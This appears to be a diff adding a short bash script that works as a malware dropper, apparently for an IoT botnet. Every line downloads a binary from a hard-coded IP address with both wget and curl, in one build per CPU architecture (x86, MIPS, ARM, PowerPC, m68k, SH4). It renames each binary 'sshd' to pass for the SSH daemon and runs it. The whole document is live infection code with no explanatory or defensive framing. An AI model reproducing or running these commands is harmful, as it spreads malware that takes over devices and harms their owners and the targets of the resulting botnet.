@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.x86; curl -O http://193.228.91.105/bins/MtODhh.x86;cat MtODhh.x86 >sshd;chmod +x *;./sshd server.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.mips; curl -O http://193.228.91.105/bins/MtODhh.mips;cat MtODhh.mips >sshd;chmod +x *;./sshd mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.mpsl; curl -O http://193.228.91.105/bins/MtODhh.mpsl;cat MtODhh.mpsl >sshd;chmod +x *;./sshd mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.arm4; curl -O http://193.228.91.105/bins/MtODhh.arm4;cat MtODhh.arm4 >sshd;chmod +x *;./sshd arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.arm5; curl -O http://193.228.91.105/bins/MtODhh.arm5;cat MtODhh.arm5 >sshd;chmod +x *;./sshd arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.arm6; curl -O http://193.228.91.105/bins/MtODhh.arm6;cat MtODhh.arm6 >sshd;chmod +x *;./sshd arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.arm7; curl -O http://193.228.91.105/bins/MtODhh.arm7;cat MtODhh.arm7 >sshd;chmod +x *;./sshd arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.ppc; curl -O http://193.228.91.105/bins/MtODhh.ppc;cat MtODhh.ppc >sshd;chmod +x *;./sshd powerpc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.m68k; curl -O http://193.228.91.105/bins/MtODhh.m68k;cat MtODhh.m68k >sshd;chmod +x *;./sshd motorola
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.105/bins/MtODhh.sh4; curl -O http://193.228.91.105/bins/MtODhh.sh4;cat MtODhh.sh4 >sshd;chmod +x *;./sshd superh4
